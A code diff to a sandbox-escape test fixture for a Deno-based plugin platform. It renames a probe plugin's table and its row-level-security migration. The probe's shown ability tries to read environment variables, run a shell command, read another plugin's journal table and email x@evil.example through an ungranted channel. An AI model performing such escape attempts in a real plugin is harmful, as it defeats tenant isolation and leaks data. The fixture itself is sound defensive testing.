@@ -46,7 +46,7 @@ export const abilities = {
         env: await tryIt(() => Deno.env.get('HOME')),
         run: await tryIt(() => new Deno.Command('ls').output()),
         foreign_table: await tryIt(() => ctx.tables.select('journal_entries', {})),
-        own_table: await tryIt(() => ctx.tables.select('nep_probe_notes', {})),
+        own_table: await tryIt(() => ctx.tables.select('nep_probe__notes', {})),
         door_off_path: await tryIt(() => ctx.doors.email.send({ to: ['x@evil.example'] })),
       };
     },
@@ -61,12 +61,12 @@ export const abilities = {
       name: 'Probe',
       description: 'Tries to escape the sandbox (test fixture).',
       doors: [],
-      tables: ['nep_probe_notes'],
+      tables: ['nep_probe__notes'],
       skills: [],
       migrations: {
-        '001_notes.sql': `create table {{schema}}.nep_probe_notes (id uuid primary key default gen_random_uuid(), company_id uuid not null, body text);
-alter table {{schema}}.nep_probe_notes enable row level security; alter table {{schema}}.nep_probe_notes force row level security;
-create policy company_isolation on {{schema}}.nep_probe_notes using (company_id = nullif(current_setting('neos.company_id', true), '')::uuid) with check (company_id = nullif(current_setting('neos.company_id', true), '')::uuid);`,
+        '001_notes.sql': `create table {{schema}}.nep_probe__notes (id uuid primary key default gen_random_uuid(), company_id uuid not null, body text);
+alter table {{schema}}.nep_probe__notes enable row level security; alter table {{schema}}.nep_probe__notes force row level security;
+create policy company_isolation on {{schema}}.nep_probe__notes using (company_id = nullif(current_setting('neos.company_id', true), '')::uuid) with check (company_id = nullif(current_setting('neos.company_id', true), '')::uuid);`,
       },
       abilities: [
         { key: 'probe.try', version: '1.0.0', title: 'Probe', description: 'probe', kind: 'read', floor: 'on', input: { type: 'object' }, output: { type: 'object' } },
